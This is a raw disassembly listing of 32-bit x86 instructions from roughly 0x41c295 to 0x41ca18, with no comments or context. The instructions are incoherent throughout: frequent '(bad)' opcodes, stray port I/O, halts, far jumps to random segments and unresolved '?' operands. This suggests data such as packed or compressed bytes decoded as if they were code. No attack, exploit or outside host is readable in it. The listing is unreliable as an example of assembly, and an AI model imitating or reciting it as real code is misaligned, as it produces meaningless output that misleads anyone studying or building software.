  41c295:	test   eax,0xdaa097d2
  41c29a:	pop    edx
  41c29b:	std    
  41c29c:	sbb    eax,0x7099b373
  41c2a1:	inc    esi
  41c2a2:	mov    eax,0xd690441e
  41c2a7:	clc    
  41c2a8:	inc    ebx
  41c2a9:	dec    edi
  41c2aa:	or     esp,esi
  41c2ac:	ror    BYTE PTR [ebp+0x10],0xd4
  41c2b0:	fsubr  st,st(4)
  41c2b2:	hlt    
  41c2b3:	dec    eax
  41c2b4:	aam    0x32
  41c2b6:	sahf   
  41c2b7:	(bad)  
  41c2b8:	fisttp WORD PTR [esi-0x18]
  41c2bb:	test   ecx,ebx
  41c2bd:	or     eax,0x725e8c92
  41c2c2:	xor    DWORD PTR [edx+0x28b2e9ae],ebp
  41c2c8:	and    al,0xf5
  41c2ca:	inc    ebx
  41c2cb:	dec    ebx
  41c2cc:	pop    eax
  41c2cd:	xor    eax,0x22c9fc99
  41c2d2:	sub    BYTE PTR [edi+0x51],dh
  41c2d5:	popf   
  41c2d6:	loope  0x41c281
  41c2d8:	and    edx,esi
  41c2da:	les    edi,FWORD PTR [eax+0x2c7d268e]
  41c2e0:	outs   dx,BYTE PTR ds:[esi]
  41c2e1:	das    
  41c2e2:	(bad)  
  41c2e3:	loope  0x41c2a2
  41c2e5:	pop    esp
  41c2e6:	shr    BYTE PTR [ebx+0x76dc4921],0xa2
  41c2ed:	mov    ecx,0x95308104
  41c2f2:	add    eax,0xae72bfbe
  41c2f7:	ss ins DWORD PTR es:[edi],dx
  41c2f9:	lds    ebp,FWORD PTR [ecx]
  41c2fb:	mov    bl,0x27
  41c2fd:	and    DWORD PTR [ebx],edx
  41c2ff:	lods   eax,DWORD PTR ds:[esi]
  41c300:	scas   al,BYTE PTR es:[edi]
  41c301:	fwait
  41c302:	mov    ecx,0x50ce48d0
  41c307:	pop    ss
  41c308:	repz cmp DWORD PTR [ebp+0x4f],edx
  41c30c:	mov    ch,0x55
  41c30e:	sbb    bh,BYTE PTR [eax+ebp*1+0x28]
  41c312:	lea    eax,[ebp+0x2249e771]
  41c318:	push   ebx
  41c319:	mov    ecx,0x784e9f80
  41c31e:	in     eax,dx
  41c31f:	(bad)  
  41c320:	ins    DWORD PTR es:[edi],dx
  41c321:	pop    esi
  41c322:	popa   
  41c323:	jmp    0x2cdb:0x2da49e21
  41c32a:	sbb    DWORD PTR ds:0xe7ac662d,0x8ad210a1
  41c334:	or     eax,0xe6497e29
  41c339:	in     al,dx
  41c33a:	and    BYTE PTR [ecx+0x2b57adf],dh
  41c340:	pop    ebp
  41c341:	inc    ebp
  41c342:	jnp    0x41c3a7
  41c344:	add    DWORD PTR [ecx+0x226e1ae5],esp
  41c34a:	pop    edx
  41c34b:	and    eax,0xa28148cc
  41c350:	mov    esp,eax
  41c352:	push   edi
  41c353:	fdiv   DWORD PTR [edx]
  41c355:	pop    es
  41c356:	nop
  41c357:	into   
  41c358:	sub    al,0x80
  41c35a:	js     0x41c392
  41c35c:	and    bl,BYTE PTR [ecx-0x35]
  41c35f:	sbb    dl,BYTE PTR [edi-0x57]
  41c362:	fsubr  DWORD PTR [edx]
  41c364:	(bad)  
  41c365:	xchg   edi,eax
  41c366:	sbb    eax,0x7b468111
  41c36b:	cs fwait
  41c36d:	or     al,0x7f
  41c36f:	pop    eax
  41c370:	in     al,0x16
  41c372:	cmp    BYTE PTR [edi],cl
  41c374:	adc    BYTE PTR [ebx-0x5a],ch
  41c377:	scas   al,BYTE PTR es:[edi]
  41c378:	div    BYTE PTR [esi+0x2d]
  41c37b:	or     DWORD PTR [edx+0x6cfcd717],esi
  41c381:	xlat   BYTE PTR ds:[ebx]
  41c382:	jmp    0x41c396
  41c384:	and    BYTE PTR [ecx+0x36],dh
  41c387:	xchg   bh,cl
  41c389:	aas    
  41c38a:	scas   al,BYTE PTR es:[edi]
  41c38b:	mov    ds:0xa059be5a,eax
  41c390:	inc    esp
  41c391:	sar    BYTE PTR [esi-0x27],0x36
  41c395:	jns    0x41c3cd
  41c397:	inc    esp
  41c398:	imul   edx,DWORD PTR [eax-0x7c],0x6ed7d0a8
  41c39f:	fstp   DWORD PTR [edx-0x13]
  41c3a2:	(bad)  
  41c3a4:	push   cs
  41c3a5:	rdtsc  
  41c3a7:	sbb    al,0x57
  41c3a9:	jl     0x41c343
  41c3ab:	push   edi
  41c3ac:	fistp  QWORD PTR [ecx-0x6d]
  41c3af:	mov    esp,0x686e21f7
  41c3b4:	xchg   ebx,eax
  41c3b5:	push   ds
  41c3b6:	loope  0x41c353
  41c3b8:	push   esp
  41c3b9:	cdq    
  41c3ba:	jg     0x41c356
  41c3bc:	pusha  
  41c3bd:	cmp    al,0xeb
  41c3bf:	mov    ds:0xa52329b5,eax
  41c3c4:	lds    esi,FWORD PTR [eax]
  41c3c6:	cmp    edi,DWORD PTR ds:0xb5ef7d56
  41c3cc:	daa    
  41c3cd:	shr    WORD PTR ds:0xc5939f92,0xe0
  41c3d5:	popa   
  41c3d6:	jmp    0x68be2e58
  41c3db:	shl    DWORD PTR [ecx+0x78237341],cl
  41c3e1:	or     al,0x4e
  41c3e3:	aam    0x47
  41c3e5:	xor    al,0xf5
  41c3e7:	mov    ebx,0xdb2a5bf6
  41c3ec:	lahf   
  41c3ed:	dec    ebp
  41c3ee:	stos   DWORD PTR es:[edi],eax
  41c3ef:	dec    ebp
  41c3f0:	adc    dh,ch
  41c3f2:	xchg   esi,eax
  41c3f3:	mov    dh,0x99
  41c3f5:	int3   
  41c3f6:	loopne 0x41c3a7
  41c3f8:	loope  0x41c456
  41c3fa:	mov    dl,0x32
  41c3fc:	leave  
  41c3fd:	sbb    eax,0x846da091
  41c402:	addr16 lahf 
  41c404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c405:	mov    edi,0xb3f6cc2c
  41c40a:	cwde   
  41c40b:	jae    0x41c47f
  41c40d:	dec    edx
  41c40e:	and    al,ah
  41c410:	push   ss
  41c411:	test   DWORD PTR [ebp+0x22e481d6],esi
  41c417:	xchg   ecx,eax
  41c418:	mov    ?,ecx
  41c41a:	sbb    DWORD PTR [eax-0x397f12ed],edx
  41c420:	dec    ebp
  41c421:	test   ebx,edx
  41c423:	mov    ah,0x81
  41c425:	mov    ch,0x1e
  41c427:	xchg   edx,eax
  41c428:	(bad)  
  41c429:	loop   0x41c467
  41c42b:	sti    
  41c42c:	inc    esp
  41c42d:	ds sub al,0x1
  41c430:	les    eax,FWORD PTR [ecx-0x4a09fdb2]
  41c436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c437:	cmp    DWORD PTR [ecx],esi
  41c439:	dec    eax
  41c43a:	inc    esi
  41c43b:	mov    esp,esi
  41c43d:	ins    DWORD PTR es:[edi],dx
  41c43e:	xor    eax,0x74841c00
  41c443:	icebp  
  41c444:	int    0x3e
  41c446:	or     BYTE PTR [ebp+0x70ca6ecf],bh
  41c44c:	or     eax,0x70938882
  41c451:	inc    ecx
  41c452:	jmp    0xdcdb:0x8d29e388
  41c459:	bound  ebp,QWORD PTR [ebx]
  41c45b:	pop    es
  41c45c:	cmp    eax,0xfdf91a81
  41c461:	sti    
  41c462:	mov    ds:0xa0e4c814,al
  41c467:	stos   DWORD PTR es:[edi],eax
  41c468:	push   edx
  41c469:	pop    esp
  41c46a:	mov    ah,al
  41c46c:	jg     0x41c4a4
  41c46e:	mov    ebp,0xa742f858
  41c473:	adc    bh,cl
  41c475:	dec    eax
  41c476:	cmp    edi,edi
  41c478:	nop
  41c479:	mov    BYTE PTR [ebp+0x4ccf955a],dh
  41c47f:	mov    bl,0x7c
  41c481:	mov    ds:0x290417d8,eax
  41c486:	das    
  41c487:	es adc eax,0x43650943
  41c48d:	adc    DWORD PTR [eax+eiz*8-0x2a],edx
  41c491:	jbe    0x41c49f
  41c493:	lods   eax,DWORD PTR ds:[esi]
  41c494:	push   0xd69dc35c
  41c499:	mov    ebx,esp
  41c49b:	jmp    0xa6e7:0xfb988c1c
  41c4a2:	or     BYTE PTR [ecx-0x74571700],dh
  41c4a8:	aas    
  41c4a9:	dec    eax
  41c4aa:	fs out 0x3b,eax
  41c4ad:	and    eax,0x237f7a72
  41c4b2:	idiv   BYTE PTR [esi]
  41c4b4:	xor    al,0x7
  41c4b6:	stos   DWORD PTR es:[edi],eax
  41c4b7:	js     0x41c4a2
  41c4b9:	mov    edi,0x75389bf5
  41c4be:	pop    es
  41c4bf:	fimul  WORD PTR [eax+0x23fef116]
  41c4c5:	inc    edi
  41c4c6:	in     eax,0x6
  41c4c8:	sub    esi,edi
  41c4ca:	cwde   
  41c4cb:	xchg   edi,eax
  41c4cc:	push   eax
  41c4cd:	inc    eax
  41c4ce:	nop
  41c4cf:	pop    esp
  41c4d0:	inc    edi
  41c4d1:	es data16 icebp 
  41c4d4:	ins    BYTE PTR es:[edi],dx
  41c4d5:	js     0x41c4c3
  41c4d7:	dec    esp
  41c4d8:	dec    ebp
  41c4d9:	adc    eax,0x418af8e6
  41c4de:	ins    DWORD PTR es:[edi],dx
  41c4df:	sbb    bl,BYTE PTR [esi]
  41c4e1:	add    esi,DWORD PTR [esi+0x32]
  41c4e4:	push   eax
  41c4e5:	push   ds
  41c4e6:	sbb    eax,0x17f6848e
  41c4eb:	das    
  41c4ec:	mov    eax,0x97c4ae2b
  41c4f1:	pop    esi
  41c4f2:	inc    eax
  41c4f3:	adc    eax,0x2a4022e8
  41c4f8:	ds adc ch,bh
  41c4fb:	mov    edx,0x45361d61
  41c500:	pop    ds
  41c501:	icebp  
  41c502:	mov    bl,0xa5
  41c504:	imul   edx
  41c506:	jl     0x41c4ef
  41c508:	sbb    al,0x7f
  41c50a:	xor    al,0x87
  41c50c:	rol    BYTE PTR [ebx+eax*2],1
  41c50f:	ins    BYTE PTR es:[edi],dx
  41c510:	sbb    DWORD PTR [ebx-0x418b7e0b],edi
  41c516:	mov    BYTE PTR [esi+0x41920642],0x3f
  41c51d:	lock int 0xc4
  41c520:	pop    esi
  41c521:	lods   al,BYTE PTR ds:[esi]
  41c522:	push   edi
  41c523:	push   es
  41c524:	cmc    
  41c525:	mov    ch,0x9c
  41c527:	outs   dx,DWORD PTR ds:[esi]
  41c528:	add    DWORD PTR [edi],ecx
  41c52a:	lods   eax,DWORD PTR ds:[esi]
  41c52b:	aad    0xb7
  41c52d:	xor    edx,edi
  41c52f:	inc    BYTE PTR [edi]
  41c531:	push   ds
  41c532:	xor    edx,DWORD PTR [edi-0x6c]
  41c535:	jecxz  0x41c59a
  41c537:	jmp    0x589c:0x4aca0bc0
  41c53e:	dec    ebp
  41c53f:	nop
  41c540:	sti    
  41c541:	jmp    0x41c4de
  41c543:	add    bh,dh
  41c545:	sub    DWORD PTR ds:0x5e3672ab,eax
  41c54b:	not    DWORD PTR [edx-0x4b416532]
  41c551:	push   esp
  41c552:	retf   
  41c553:	lahf   
  41c554:	ret    0x1846
  41c557:	mov    ebp,ecx
  41c559:	or     al,0xcd
  41c55b:	push   esp
  41c55c:	xor    al,0x6a
  41c55e:	cmp    DWORD PTR [eax+0x7a],esi
  41c561:	test   eax,0x95ec47be
  41c566:	aaa    
  41c567:	scas   eax,DWORD PTR es:[edi]
  41c568:	cmp    cl,BYTE PTR ds:0x3d69b1a0
  41c56e:	add    DWORD PTR [ebp+ebx*4-0x2b],esp
  41c572:	add    edi,DWORD PTR [ebp-0x5f9c2b8d]
  41c578:	loopne 0x41c54f
  41c57a:	ds js  0x41c5a7
  41c57d:	pop    edi
  41c57e:	rol    bh,cl
  41c580:	jbe    0x41c516
  41c582:	adc    al,cl
  41c584:	add    dl,0x58
  41c587:	test   DWORD PTR [eax+0x4b],0x935eb445
  41c58e:	mov    ecx,0xaf56a439
  41c593:	scas   al,BYTE PTR es:[edi]
  41c594:	adc    BYTE PTR es:[eax+0x7b1e6d9c],dh
  41c59b:	sub    eax,DWORD PTR [esi+0x20eebd4a]
  41c5a1:	data16 sbb BYTE PTR [ebp+0x2fb16727],dl
  41c5a8:	imul   ecx,esp,0xb1cade26
  41c5ae:	ret    
  41c5af:	xlat   BYTE PTR ds:[ebx]
  41c5b0:	fistp  QWORD PTR [ecx]
  41c5b2:	mov    cl,0xef
  41c5b4:	adc    eax,DWORD PTR [edx]
  41c5b6:	mov    cx,WORD PTR [edi+0xe]
  41c5ba:	cmp    bl,BYTE PTR [ebx]
  41c5bc:	and    ebx,DWORD PTR [edi]
  41c5be:	in     eax,dx
  41c5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5c0:	push   cs
  41c5c1:	call   0x834dcf2d
  41c5c6:	cmp    al,0xdf
  41c5c8:	sti    
  41c5c9:	xchg   ecx,eax
  41c5ca:	add    eax,0x9db7bb0d
  41c5cf:	outs   dx,BYTE PTR ds:[esi]
  41c5d0:	lea    edi,[ecx]
  41c5d2:	retf   0xab43
  41c5d5:	and    al,0x24
  41c5d7:	push   eax
  41c5d8:	inc    ebp
  41c5d9:	mov    ds:0xdcd3675a,eax
  41c5de:	push   ebx
  41c5df:	pop    edx
  41c5e0:	xchg   edi,eax
  41c5e1:	aad    0xea
  41c5e3:	and    bh,BYTE PTR ds:0x94160da5
  41c5e9:	xor    DWORD PTR [edi],edx
  41c5eb:	pop    ds
  41c5ec:	arpl   WORD PTR [ebp+0x435faf5f],si
  41c5f2:	gs mov ah,0x73
  41c5f5:	inc    edi
  41c5f6:	cbw    
  41c5f8:	adc    BYTE PTR fs:[ebx-0x3feef6dc],ah
  41c5ff:	jle    0x41c622
  41c601:	ins    DWORD PTR es:[edi],dx
  41c602:	push   cs
  41c603:	mov    ebx,0x98274978
  41c608:	retf   
  41c609:	jo     0x41c61c
  41c60b:	ins    DWORD PTR es:[edi],dx
  41c60c:	mov    edx,0x247eaefb
  41c611:	into   
  41c612:	das    
  41c613:	pop    ecx
  41c614:	jmp    0xdbf39d4e
  41c619:	aam    0x83
  41c61b:	das    
  41c61c:	mov    ebx,0x5064466b
  41c621:	jmp    0xbd07:0x951bf4b2
  41c628:	pushw  ss
  41c62a:	push   0xffffffea
  41c62c:	fs loope 0x41c5fb
  41c62f:	push   0xe8e42e46
  41c634:	dec    edx
  41c635:	sbb    DWORD PTR [edi+0x1e],0x7e
  41c639:	xchg   ebp,eax
  41c63a:	inc    edi
  41c63b:	in     eax,dx
  41c63c:	push   edx
  41c63d:	sar    DWORD PTR [edi+ebp*8-0x24fe1a5],cl
  41c644:	mov    cl,0x11
  41c646:	outs   dx,DWORD PTR ds:[esi]
  41c647:	dec    edi
  41c648:	sbb    BYTE PTR [edi],bh
  41c64a:	mov    cs,WORD PTR [esi]
  41c64c:	or     ebx,DWORD PTR [ebx-0x5a]
  41c64f:	pop    ds
  41c650:	pop    es
  41c651:	cmp    BYTE PTR ds:0xb9e7a7fd,bh
  41c657:	outs   dx,BYTE PTR ds:[esi]
  41c658:	adc    dh,BYTE PTR [ebx]
  41c65a:	in     eax,dx
  41c65b:	int    0xb8
  41c65d:	or     BYTE PTR [ebx+0x43a4e631],dl
  41c663:	jae    0x41c6b7
  41c665:	pop    esi
  41c666:	stos   BYTE PTR es:[edi],al
  41c667:	push   edi
  41c668:	and    dh,dh
  41c66a:	retf   0xb537
  41c66d:	shr    DWORD PTR [esi+edi*8],0xa7
  41c671:	test   al,0xe1
  41c673:	dec    ebx
  41c674:	dec    esi
  41c675:	in     al,0x9
  41c677:	cmp    eax,0x45e1ac0a
  41c67c:	or     esi,DWORD PTR [ecx]
  41c67e:	sbb    al,0x82
  41c680:	dec    esp
  41c681:	sub    DWORD PTR [esp+0x5f],esi
  41c685:	enter  0x5cda,0xd6
  41c689:	fimul  WORD PTR [esi+0x3d]
  41c68c:	jbe    0x41c69c
  41c68e:	je     0x41c62f
  41c690:	push   es
  41c691:	loop   0x41c6d9
  41c693:	sub    eax,DWORD PTR [eax+ebx*1]
  41c696:	inc    esi
  41c697:	sbb    eax,0x562ed26b
  41c69c:	mov    ebp,0x2ca0d9ba
  41c6a1:	mov    dl,BYTE PTR [esi+0x4b3b4e11]
  41c6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6a8:	push   es
  41c6a9:	pop    ds
  41c6aa:	inc    edx
  41c6ab:	leave  
  41c6ac:	push   ds
  41c6ad:	xchg   esp,eax
  41c6ae:	mov    edx,0x17bd5c4d
  41c6b3:	int    0xe9
  41c6b5:	stos   DWORD PTR es:[edi],eax
  41c6b6:	std    
  41c6b7:	dec    ecx
  41c6b8:	ss jae 0x41c706
  41c6bb:	(bad)  
  41c6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6bd:	adc    dh,BYTE PTR [esi]
  41c6bf:	cld    
  41c6c0:	ins    DWORD PTR es:[edi],dx
  41c6c1:	clc    
  41c6c2:	sub    BYTE PTR [ecx+0x3cc4e122],dh
  41c6c8:	push   cs
  41c6c9:	mov    ecx,0xda6ca19e
  41c6ce:	push   ebx
  41c6cf:	mov    ebp,esp
  41c6d1:	dec    esp
  41c6d2:	jle    0x41c696
  41c6d4:	imul   edx,DWORD PTR ds:0xe423a574,0xcf776ab4
  41c6de:	daa    
  41c6df:	dec    ebp
  41c6e0:	sahf   
  41c6e1:	xchg   al,cl
  41c6e3:	xor    eax,0x22b4ae43
  41c6e8:	iret   
  41c6e9:	push   0x28
  41c6eb:	add    BYTE PTR [edx],cl
  41c6ed:	out    dx,eax
  41c6ee:	or     al,0x4e
  41c6f0:	mov    ch,dl
  41c6f2:	mov    bl,0xde
  41c6f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6f5:	mov    ds:0x5a5c0148,eax
  41c6fa:	out    dx,al
  41c6fb:	rcl    DWORD PTR [edi],cl
  41c6fd:	dec    ecx
  41c6fe:	fistp  QWORD PTR [edx+0x1664220]
  41c704:	in     al,dx
  41c705:	outs   dx,BYTE PTR ds:[esi]
  41c706:	sub    BYTE PTR [eax+0x59],dl
  41c709:	cld    
  41c70a:	xchg   BYTE PTR [ecx+0x2b2b0d3d],bh
  41c710:	ins    BYTE PTR es:[edi],dx
  41c711:	and    al,0xfb
  41c713:	cdq    
  41c714:	shl    dh,cl
  41c716:	ror    eax,0xfa
  41c719:	pop    esi
  41c71a:	loopne 0x41c710
  41c71c:	lods   eax,DWORD PTR ds:[esi]
  41c71d:	pop    esp
  41c71e:	pop    es
  41c71f:	inc    esi
  41c720:	xor    BYTE PTR [edx-0x6df9da95],cl
  41c726:	inc    ecx
  41c727:	es push 0x2a
  41c72a:	mov    ebx,0x9ae062ea
  41c72f:	loop   0x41c6c0
  41c731:	jecxz  0x41c6c9
  41c733:	outs   dx,BYTE PTR ds:[esi]
  41c734:	or     eax,0xfb14740f
  41c739:	mov    ch,cl
  41c73b:	clc    
  41c73c:	ds leave 
  41c73e:	(bad)  
  41c73f:	ficom  WORD PTR [ebx]
  41c741:	mov    esi,0xb017b241
  41c746:	ins    BYTE PTR es:[edi],dx
  41c747:	in     al,0x5c
  41c749:	cmp    eax,0xf912a1ca
  41c74e:	pop    ecx
  41c74f:	push   ecx
  41c750:	dec    BYTE PTR [ebx+0x439bb7c9]
  41c756:	mov    esp,edx
  41c758:	mov    esi,0xb3e94bae
  41c75d:	and    eax,0xee6eaced
  41c762:	ret    0xc486
  41c765:	jno    0x41c70e
  41c767:	gs repz pop es
  41c76a:	(bad)  
  41c76b:	sbb    DWORD PTR [ebx+0x5e],esi
  41c76e:	das    
  41c76f:	push   ebx
  41c770:	mov    ch,0x6d
  41c772:	hlt    
  41c773:	and    eax,0xdeee0589
  41c778:	xor    esi,DWORD PTR ds:0x89b586b9
  41c77e:	add    BYTE PTR [eax-0x2d23f578],ch
  41c784:	cs adc al,0x2a
  41c787:	or     ch,BYTE PTR [edi]
  41c789:	pop    ss
  41c78a:	or     esi,DWORD PTR [eax]
  41c78c:	push   0x81b00d2a
  41c791:	ds mov esp,0x15b75be4
  41c797:	daa    
  41c798:	imul   eax,DWORD PTR [eax+0x43e3c33c],0x69ac2698
  41c7a2:	mov    edx,edi
  41c7a4:	or     eax,0x4f725dd0
  41c7a9:	shl    ah,1
  41c7ab:	add    eax,0x21f563b4
  41c7b0:	add    esp,DWORD PTR [esi-0x59]
  41c7b3:	adc    DWORD PTR [ebp+0x6836535b],0x18a5e4ca
  41c7bd:	mov    bh,0x49
  41c7bf:	clc    
  41c7c0:	fsubr  QWORD PTR [ebx-0x3727335]
  41c7c6:	pop    ecx
  41c7c7:	lods   al,BYTE PTR ds:[esi]
  41c7c8:	adc    dl,dh
  41c7ca:	xchg   ecx,eax
  41c7cb:	dec    esp
  41c7cc:	in     al,0xe6
  41c7ce:	es mov edi,0x98b2d690
  41c7d4:	mov    ecx,ebx
  41c7d6:	or     al,0x8e
  41c7d8:	outs   dx,DWORD PTR ds:[esi]
  41c7d9:	ins    BYTE PTR es:[edi],dx
  41c7da:	iret   
  41c7db:	dec    esp
  41c7dc:	rcl    DWORD PTR [ebp+0x69],0x76
  41c7e0:	lods   al,BYTE PTR ds:[esi]
  41c7e1:	pop    esp
  41c7e2:	and    eax,0x3c5a9d9d
  41c7e7:	retf   
  41c7e8:	push   0x9ae7a9e
  41c7ed:	lds    eax,FWORD PTR ds:0x8d3a7f35
  41c7f3:	outs   dx,DWORD PTR ds:[esi]
  41c7f4:	stc    
  41c7f5:	dec    BYTE PTR [ecx]
  41c7f7:	and    edx,edi
  41c7f9:	sub    eax,0x38192147
  41c7fe:	stos   BYTE PTR es:[edi],al
  41c7ff:	pop    edi
  41c800:	in     eax,0xff
  41c802:	in     eax,0xff
  41c804:	push   0xfb64f683
  41c809:	and    cl,BYTE PTR [edi-0x579a56f5]
  41c80f:	into   
  41c810:	pop    edx
  41c811:	jns    0x41c819
  41c813:	mov    bl,0x9d
  41c815:	jmp    0x3567:0xa13fc8aa
  41c81c:	jecxz  0x41c83f
  41c81e:	je     0x41c845
  41c820:	sar    ecx,1
  41c822:	add    DWORD PTR [edx-0x50d594],ebx
  41c828:	sti    
  41c829:	(bad)  
  41c82a:	or     BYTE PTR [edi+0x42],cl
  41c82d:	repz and eax,0xfe8f2f82
  41c833:	int3   
  41c834:	ins    DWORD PTR es:[edi],dx
  41c835:	mov    ?,WORD PTR [ecx+0x50e35765]
  41c83b:	jns    0x41c80b
  41c83d:	loopne 0x41c7c8
  41c83f:	jo     0x41c8a3
  41c841:	stos   BYTE PTR es:[edi],al
  41c842:	inc    edx
  41c843:	mov    al,0x77
  41c845:	jno    0x41c8ac
  41c847:	lea    ecx,[eax-0x7849c8e4]
  41c84d:	dec    ecx
  41c84e:	cli    
  41c84f:	ret    
  41c850:	sbb    cl,ch
  41c852:	fs das 
  41c854:	call   FWORD PTR [edx+0x59cb4ea5]
  41c85a:	leave  
  41c85b:	push   ecx
  41c85c:	jb     0x41c81a
  41c85e:	(bad)  
  41c85f:	leave  
  41c860:	push   ebx
  41c861:	mov    eax,0x13e079c4
  41c866:	jbe    0x41c873
  41c868:	rcl    DWORD PTR [ebx],1
  41c86a:	push   0xffffffdb
  41c86c:	test   DWORD PTR [esi],esi
  41c86e:	jmp    0xb4fa:0xfbca0c4
  41c875:	stc    
  41c876:	loop   0x41c854
  41c878:	xor    eax,0xcead3f9b
  41c87d:	dec    ebp
  41c87e:	stc    
  41c87f:	in     al,0xbd
  41c881:	cwde   
  41c882:	sub    dx,WORD PTR [esi]
  41c885:	out    0x9f,al
  41c887:	pusha  
  41c888:	and    al,0x72
  41c88a:	jmp    0xff76:0xccf591d8
  41c891:	fcomp  DWORD PTR [ecx-0x8]
  41c894:	push   ebx
  41c895:	add    DWORD PTR [eax],0x20
  41c898:	jecxz  0x41c821
  41c89a:	repz cmp al,0x2a
  41c89d:	retf   0xa83d
  41c8a0:	push   ds
  41c8a1:	cli    
  41c8a2:	ror    BYTE PTR [eax],1
  41c8a4:	test   ecx,esi
  41c8a6:	jmp    0x41c834
  41c8a8:	mov    dh,0xac
  41c8aa:	ret    0x85f1
  41c8ad:	cdq    
  41c8ae:	aad    0xef
  41c8b0:	xchg   esp,eax
  41c8b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8b2:	xor    al,0x7e
  41c8b4:	dec    ebx
  41c8b5:	push   cs
  41c8b6:	and    ebx,edi
  41c8b8:	xchg   esi,eax
  41c8b9:	jge    0x41c885
  41c8bb:	jns    0x41c8b2
  41c8bd:	fldenv [ebx+0x7b00bf4c]
  41c8c3:	inc    ecx
  41c8c4:	xchg   edx,eax
  41c8c5:	bound  eax,QWORD PTR [esi-0x7491ae38]
  41c8cb:	aaa    
  41c8cc:	imul   edi,DWORD PTR [edi+edx*1],0xfb36fa34
  41c8d3:	jo     0x41c91c
  41c8d5:	(bad)  
  41c8d6:	pop    edx
  41c8d7:	lods   al,BYTE PTR ds:[esi]
  41c8d8:	std    
  41c8d9:	mov    cs,WORD PTR [edi-0x6b657833]
  41c8df:	scas   eax,DWORD PTR es:[edi]
  41c8e0:	xchg   ebx,eax
  41c8e1:	pop    eax
  41c8e2:	hlt    
  41c8e3:	gs sub eax,0x290e2c52
  41c8e9:	add    al,0x49
  41c8eb:	popa   
  41c8ec:	call   0xc2c62e9b
  41c8f1:	(bad)  
  41c8f2:	out    0xa1,eax
  41c8f4:	or     DWORD PTR [edx+0x56c7819b],edx
  41c8fa:	stos   BYTE PTR es:[edi],al
  41c8fb:	arpl   WORD PTR [edx],sp
  41c8fd:	cmp    BYTE PTR [eax+0x6e0f4790],dh
  41c903:	ja     0x41c8e9
  41c905:	mov    dh,BYTE PTR [ebp-0x195ee874]
  41c90b:	sbb    esp,DWORD PTR [ebx-0x5c3ff619]
  41c911:	cmp    eax,0x98abf6c1
  41c916:	(bad)  
  41c917:	aaa    
  41c918:	pop    eax
  41c919:	adc    al,0x61
  41c91b:	popf   
  41c91c:	shl    DWORD PTR [edi+0x71],0x82
  41c920:	aam    0xfa
  41c922:	and    DWORD PTR [edx+0x69fac003],edx
  41c928:	test   al,0x3
  41c92a:	mov    WORD PTR [esi+0x45],?
  41c92d:	out    0xcc,eax
  41c92f:	scas   al,BYTE PTR es:[edi]
  41c930:	sub    DWORD PTR [esi+0x6189ab6a],0x1b
  41c937:	jmp    0x41c929
  41c939:	push   ss
  41c93a:	add    eax,0xd8f9fd96
  41c93f:	dec    edi
  41c940:	out    0xab,al
  41c942:	(bad)  
  41c943:	cmp    al,ah
  41c945:	and    BYTE PTR fs:[esp+ebp*8],dl
  41c949:	out    dx,eax
  41c94a:	or     ecx,DWORD PTR [ebx-0xbee7ac9]
  41c950:	mov    ds:0xa111ca80,al
  41c955:	hlt    
  41c956:	in     al,0x69
  41c958:	out    dx,al
  41c959:	mov    ds:0x1dd785d3,al
  41c95e:	inc    ebp
  41c95f:	sahf   
  41c960:	pslld  mm1,QWORD PTR [eax+esi*1-0xb]
  41c965:	dec    eax
  41c966:	pusha  
  41c967:	nop
  41c968:	lea    ebx,[ecx+0x10cbea50]
  41c96e:	in     al,0x3d
  41c970:	adc    ecx,DWORD PTR [esi+0x31]
  41c973:	jno    0x41c93c
  41c975:	push   ebx
  41c976:	or     esi,esp
  41c978:	or     DWORD PTR [eax+0x53],edx
  41c97b:	fistp  QWORD PTR [edx+0x5627f6c3]
  41c981:	je     0x41c9eb
  41c983:	and    bh,BYTE PTR [edi+0x52]
  41c986:	sahf   
  41c987:	add    al,0xf
  41c989:	jns    0x41c91f
  41c98b:	enter  0x2b56,0x39
  41c98f:	ja     0x41c92e
  41c991:	daa    
  41c992:	and    eax,0x586a100e
  41c997:	fiadd  DWORD PTR [ebx+0x36]
  41c99a:	jmp    0xdec3:0x219c0d06
  41c9a1:	pop    es
  41c9a2:	dec    edx
  41c9a3:	mov    ebp,0xc1fadc53
  41c9a8:	daa    
  41c9a9:	(bad)  
  41c9aa:	mov    ch,0xcb
  41c9ac:	push   ecx
  41c9ad:	enter  0x5161,0xd5
  41c9b1:	pop    ds
  41c9b2:	retf   0xa2e1
  41c9b5:	inc    esp
  41c9b6:	dec    ecx
  41c9b7:	in     eax,dx
  41c9b8:	pop    esp
  41c9b9:	xor    BYTE PTR [eax],al
  41c9bb:	js     0x41c9bc
  41c9bd:	es sti 
  41c9bf:	lods   eax,DWORD PTR ds:[esi]
  41c9c0:	inc    ecx
  41c9c1:	mov    dl,0x13
  41c9c3:	(bad)  
  41c9c4:	rcl    DWORD PTR [esp+ecx*2+0x51],cl
  41c9c8:	jp     0x41c9c0
  41c9ca:	jg     0x41c9ea
  41c9cc:	or     al,0xed
  41c9ce:	lods   eax,DWORD PTR ds:[esi]
  41c9cf:	or     eax,0x35d27dd1
  41c9d4:	push   0x53
  41c9d6:	repz mov eax,0x912e9389
  41c9dc:	rcr    dl,1
  41c9de:	xchg   bl,dh
  41c9e0:	xchg   ebp,eax
  41c9e1:	xor    ah,BYTE PTR ds:0x90663030
  41c9e7:	or     eax,0x4c07a45f
  41c9ec:	mov    DWORD PTR [esi],eax
  41c9ee:	popa   
  41c9ef:	xchg   ecx,eax
  41c9f0:	inc    edi
  41c9f1:	imul   ebx,DWORD PTR [esi],0x8b4647f8
  41c9f7:	test   DWORD PTR [ebx+0x6df44705],eax
  41c9fd:	int3   
  41c9fe:	mov    ebp,0xcffe0dc7
  41ca03:	arpl   WORD PTR [ebp+0x3b],bx
  41ca06:	cmovge ebx,DWORD PTR [ebx]
  41ca09:	out    dx,eax
  41ca0a:	aas    
  41ca0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca0d:	or     DWORD PTR [ebx-0x5c],esp
  41ca10:	jle    0x41c9cd
  41ca12:	mov    ds:0x1824fcf5,eax
  41ca17:	cdq    
  41ca18:	retf   
